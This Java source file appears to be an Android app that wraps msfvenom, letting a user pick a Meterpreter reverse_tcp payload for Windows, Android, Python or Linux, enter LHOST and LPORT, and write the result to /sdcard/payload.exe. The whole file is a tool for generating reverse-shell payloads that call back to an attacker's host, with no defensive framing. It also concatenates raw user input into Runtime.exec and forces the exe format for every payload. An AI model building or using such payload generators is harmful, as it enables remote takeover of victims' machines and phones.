package com.gui.msfvenom;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {

	private Spinner payloadSpinner;
	private EditText lhostEditText, lportEditText;
	private Button generateButton;
	private TextView outputTextView;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		// Initialize UI components
		payloadSpinner = findViewById(R.id.payloadSpinner);
		lhostEditText = findViewById(R.id.lhostEditText);
		lportEditText = findViewById(R.id.lportEditText);
		generateButton = findViewById(R.id.generateButton);
		outputTextView = findViewById(R.id.outputTextView);

		// --- Populate Spinner ---
		String[] payloads = new String[] { "windows/meterpreter/reverse_tcp", "android/meterpreter/reverse_tcp",
				"python/meterpreter/reverse_tcp", "linux/x86/meterpreter/reverse_tcp" };
		ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item,
				payloads);
		payloadSpinner.setAdapter(adapter);

		// --- Set On-Click Listener for the Button ---
		generateButton.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				generatePayload();
			}
		});
	}

	private void generatePayload() {
		// Get user input
		String selectedPayload = payloadSpinner.getSelectedItem().toString();
		String lhost = lhostEditText.getText().toString();
		String lport = lportEditText.getText().toString();

		// Basic input validation
		if (lhost.isEmpty() || lport.isEmpty()) {
			outputTextView.setText("Error: LHOST and LPORT cannot be empty.");
			return;
		}

		// --- Construct the msfvenom command ---
		String command = "msfvenom -p " + selectedPayload + " LHOST=" + lhost + " LPORT=" + lport
				+ " -f exe -o /sdcard/payload.exe";

		// --- Execute the command ---
		outputTextView.setText("Generating payload...\nCommand: " + command);

		try {
			Process process = Runtime.getRuntime().exec(command);

			BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

			StringBuilder output = new StringBuilder();
			String line;
			while ((line = reader.readLine()) != null) {
				output.append(line).append("\n");
			}
			while ((line = errorReader.readLine()) != null) {
				output.append("ERROR: ").append(line).append("\n");
			}

			process.waitFor();

			if (output.length() == 0) {
				outputTextView.append("\nPayload generation complete (No output, check file system).");
			} else {
				outputTextView.append("\n" + output.toString());
			}

		} catch (IOException | InterruptedException e) {
			outputTextView.append("\nError executing command: " + e.getMessage());
			e.printStackTrace();
		}
	}
}
